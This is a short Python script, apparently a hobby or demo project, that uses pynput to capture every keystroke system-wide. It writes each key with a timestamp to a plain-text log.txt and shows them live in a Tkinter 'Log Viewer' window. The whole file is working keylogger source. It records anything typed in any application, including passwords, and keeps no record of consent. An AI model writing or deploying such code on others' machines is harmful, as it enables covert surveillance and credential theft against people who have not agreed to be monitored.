#!/usr/bin/env python
import pynput
from pynput import keyboard
import tkinter as tk
import time

log_listbox = None  # global var

def append_to_log(string):
    string = f"[{time.strftime('%H:%M:%S')}] {string}"

    # write plain text
    with open("log.txt", "a") as file:
        file.write(string + "\n")

    # updating GUI
    if log_listbox:
        log_listbox.after(0, lambda: (
            log_listbox.insert(tk.END, string),
            log_listbox.see(tk.END)
        ))

def process_key_press(key):
    try:
        current_key = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "

    append_to_log(current_key)

def gui():
    global log_listbox
    
    root = tk.Tk()
    root.geometry("800x500")
    root.title("Log Viewer")

    frame = tk.Frame(root)
    frame.pack(fill=tk.BOTH, expand=True)

    scrollbar = tk.Scrollbar(frame)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

    log_listbox = tk.Listbox(frame, yscrollcommand=scrollbar.set)
    log_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    scrollbar.config(command=log_listbox.yview)

    root.mainloop()

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    keyboard_listener.start()
    gui()

start()